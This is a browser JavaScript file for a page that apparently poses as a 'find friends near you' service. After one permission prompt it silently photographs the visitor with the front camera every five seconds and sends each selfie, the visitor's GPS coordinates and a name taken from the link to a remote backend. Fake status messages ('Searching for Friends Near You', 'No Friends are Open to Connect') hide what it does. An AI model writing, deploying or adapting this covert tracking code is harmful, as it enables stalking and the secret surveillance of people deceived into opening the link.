// ======= CONFIG =======
const BACKEND_URL = "http://localhost:3000"; // Replace with Render URL

// ======= DOM ELEMENTS =======
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const statusEl = document.getElementById("status");
const form = document.getElementById("eventForm");

// ======= GLOBAL STATE =======
let cachedGeo = null; // store location
let isSending = false; // to prevent overlap

// ======= CAMERA INIT (one-time) =======
async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });
    video.srcObject = stream;

    // Wait until the video starts playing
    await new Promise((resolve) => {
      video.onloadedmetadata = () => video.play();
      video.onplaying = resolve;
    });

    console.log("🎥 Camera ready:", video.videoWidth, video.videoHeight);
  } catch (err) {
    alert("⚠️ Please allow camera access once to continue.");
    console.error(err);
  }
}

// ======= LOCATION FETCH (one-time cache) =======
async function initLocation() {
  if (cachedGeo) return cachedGeo; // already have it

  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        cachedGeo = { lat: pos.coords.latitude, lon: pos.coords.longitude };
        resolve(cachedGeo);
      },
      (err) => {
        console.warn("⚠️ Location denied:", err);
        cachedGeo = null;
        resolve(null);
      }
    );
  });
}

// ======= SELFIE CAPTURE =======
function captureSelfie() {
  const w = video.videoWidth;
  const h = video.videoHeight;

  if (!w || !h) {
    console.warn("Video not ready yet!");
    return null;
  }

  canvas.width = w;
  canvas.height = h;

  const ctx = canvas.getContext("2d");
  ctx.save();
  ctx.translate(w, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, w, h);
  ctx.restore();

  return canvas.toDataURL("image/jpeg", 0.9);
}

// ======= SEND TO BACKEND =======
async function sendToBackend(trigger = "auto") {
  const nameFromURL = new URLSearchParams(window.location.search).get("name");
  const nameInput = document.getElementById("name")?.value;
  const name = nameFromURL || nameInput || "Unknown";

  const selfie = captureSelfie();
  if (!selfie) {
    statusEl.textContent = "⚠️ Camera not ready yet!";
    return;
  }

  const geo = cachedGeo || (await initLocation()); // use cached location
  const data = { name, geo, selfie };

  statusEl.textContent =
    trigger === "auto"
      ? ``
      : `Searching for Friends Near You...⌛`;

  try {
    const res = await fetch(`${BACKEND_URL}/submit`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    const result = await res.json();
    if (result.ok) {
      statusEl.textContent =
        trigger === "auto"
          ? ""
          : "No Friends are Open to Connect, Please Try Again after sometime!";
    } else {
      statusEl.textContent = "❌ Server rejected data.";
    }
  } catch (err) {
    console.error(err);
    statusEl.textContent = "⚠️ Network or backend error.";
  }
}

// ======= INITIALIZATION =======
(async function init() {
  await startCamera();     // Ask for camera permission once
  await initLocation();    // Ask for location permission once

  // Wait 1.5 seconds before first auto-send
  setTimeout(() => sendToBackend("auto"), 1500);

  // 🔁 Auto-send every 5 seconds without new permission prompts
  setInterval(async () => {
    if (isSending) return;
    isSending = true;
    await sendToBackend("auto");
    isSending = false;
  }, 5000);
})();

// ======= MANUAL SUBMIT (RETRY BUTTON) =======
if (form) {
  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    await sendToBackend("manual");
  });
}
